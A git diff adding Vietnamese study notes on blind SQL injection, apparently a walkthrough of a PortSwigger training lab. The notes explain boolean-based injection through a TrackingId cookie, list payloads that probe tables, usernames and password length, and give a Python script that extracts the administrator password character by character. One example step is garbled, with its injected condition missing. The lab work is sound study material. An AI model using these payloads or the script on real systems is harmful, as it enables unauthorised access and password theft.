@@ -289,19 +289,167 @@ Ta thấy có 2 cột đáng nghi, giờ ta xem data của 2 cột đó xem có 
 
 => Ta đã thấy được tài khoản mật khẩu của administrator
 
---------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------
 
 Blind SQL Injection 
 
-Lỗi tấn công SQL injection mù xảy ra khi một ứng dụng dễ bị tấn công SQL Injection, nhưng phản 
+Lỗi tấn công SQL injection mù xảy ra khi một ứng dụng dễ bị tấn công SQL Injection, nhưng phản  hồi HTTP của nó không chứa kết quả của truy 
 
-hồi HTTP của nó không chứa kết quả của truy vấn SQL liên quan 
+vấn SQL liên quan 
 
-Ứng dụng sử dụng cookie TrackingID để theo dõi người dùng. Khi người dùng gửi yêu cầu đến
+Ứng dụng sử dụng cookie TrackingID để theo dõi người dùng. Khi người dùng gửi yêu cầu đến website, giá trị của cookie sẽ được đưa trực tiếp 
 
-website, giá trị của cookie sẽ được đưa trực tiếp vào câu truy vấn SQL:
+vào câu truy vấn SQL:
 
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+Ứng dụng sẽ kiểm tra xem TrackingId có tồn tại trong cơ sở dữ liệu hay không. Nếu tồn tại, website sẽ hiển thị thông báo:
+
+- Welcome back
+
+Ngược lại, nếu không tồn tại thì thông báo này sẽ không xuất hiện.
+
+Ví dụ, kẻ tấn công sửa cookie thành: ' OR 1=1--
+
+Khi đó câu truy vấn sẽ trở thành:
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '' OR 1=1--
+
+Điều kiện 1=1 luôn đúng nên truy vấn sẽ trả về dữ liệu. Website sẽ hiểu rằng người dùng hợp lệ và hiển thị thông báo:
+
+- Welcome back
+
+Ngược lại, nếu sử dụng: ' OR 1=2--
+
+Thì điều kiện 1=2 luôn sai, truy vấn không trả về dữ liệu và website sẽ không hiển thị thông báo "Welcome back".
+
+Giả sử có một bảng là Users với 2 cột là Username và Password và có 1 user gọi là Administrator. Ta có thể xác định password cho user đó bằng 
+
+cách gửi một chuỗi input để kiểm tra password từng ký tự một
+
+Để làm điều này, bắt đầu với input sau:
+
+- xyz'      
+
+Tin nhắn trả về "Welcome back" chỉ ra rằng điều kiện tiêm là đúng vì vậy ký tự đầu tiên của mật khẩu lớn hơn m
+
+Tiếp theo ta gửi input:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+
+Không có tin nhắn trả về "Welcome back" chỉ ra rằng điều kiện tiêm là sai vì vậy ký tự đầu tiên của mật khẩu nhỏ hơn t 
+
+Cuối cùng ta gửi input:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+Có tin nhắn trả về "Welcome back" ta xác nhận rằng ký tự đầu tiên của mật khẩu là 's'
+
+=> Ta cứ tiếp tục như vậy cho đến khi tìm được mật khẩu 
+
+LAB: Blind SQL injection with conditional responses
+
+![alt text](image-37.png)
+
+- atabase chứa một bảng gọi là users với 2 cột username và password
+
+Mục tiêu: Cần khi thác lỗ hổng Blind SQL injection để tìm ra password của administrator
+
+Đầu tiên khi ta đăng nhập vào trang web và chọn 1 category bất kỳ thì ta thấy trên màn hình hiện dòng chữ "Welcome back'
+
+![alt text](image-38.png)
+
+Và trong request có 1 header là TrackingID 
+
+![alt text](image-39.png)
+
+Và TrackingID ở đây có thể dùng để theo dõi người dùng/phiên truy cập 
+
+Và ở đây có thể người ta đang code theo kiểu: SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+
+Và giờ ta sữ thử kiểm tra suy đoán của mình bằng cách inject vào sau TrackingID một payload: '+AND+1+=+0-- và '+AND+1+=+1-- để xem server trả 
+
+về response như thế nào
+
+![alt text](image-40.png)
+
+=> Không trả về chuỗi 'welcomeback'
+
+![alt text](image-41.png)
+
+=> Có trả về chuỗi 'Welcome back'
+
+Như vậy khi câu query là True thì sẽ có chuỗi trả về còn khi là False thì không
+
+Giờ ta sẽ kiểm tra thử xem trong database có table nào tên là users không bằng cách chèn payload: '+AND+(SELECT+'a'+FROM+users+LIMIT+1)='a'--
+
+![alt text](image-42.png)
+
+=> Có 'Welcome back' như vậy là có 1 table tên users 
+
+Giờ ta sẽ thử xem trong bảng users đó có cột usename = 'administrator' hay không bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE
+
++username='administrator')='a'--
+
+![alt text](image-43.png)
+
+=> Có 1 user tên 'administrator'
+
+Tiếp theo ta sẽ thử đoán xem password cảu administrator có bao nhiêu ký tự bằng cách chèn: '+AND+(SELECT+'a'+FROM+users+WHERE
+
++username%3d'administrator'+AND+LENGTH(password)=20)%3d'a'--
+
+![alt text](image-44.png)
+
+Sau khi thử nhiều số ta đã tìm ra được password có 20 ký tự 
+
+Và giờ ta sẽ đi brute force password của administrator bằng cách dùng script:
+
+import requests
+import string
+
+URL = "https://0a4700c70486bfdc80e15320001a0077.web-security-academy.net/"
+
+cookies = {
+    "session" : "2jm9O8AiP0cEXt891ojntXzKGSyrJIo7",
+    "TrackingId" : "X3qrfxDah3FET9LN"
+}
+
+password = ""
+trackingID_original = "X3qrfxDah3FET9LN"
+
+CHARSET = string.ascii_letters + string.digits
+
+for i in range(1,21):
+
+    Found = False
+
+    for c in CHARSET:
+
+        pay_load = (trackingID_original + f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{c}'--")
+        cookies["TrackingId"] = pay_load
+
+        response = requests.get(URL, cookies=cookies)
+
+        if "Welcome back!" in response.text:
+            Found = True
+            password += c
+            print(f"[+] Found character: {i} : {c}")
+            break
+    if not Found:
+        print(f"[!] Not Found")
+        break
+
+print(f"Password is : {password}")
+
+-------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
 
 
 
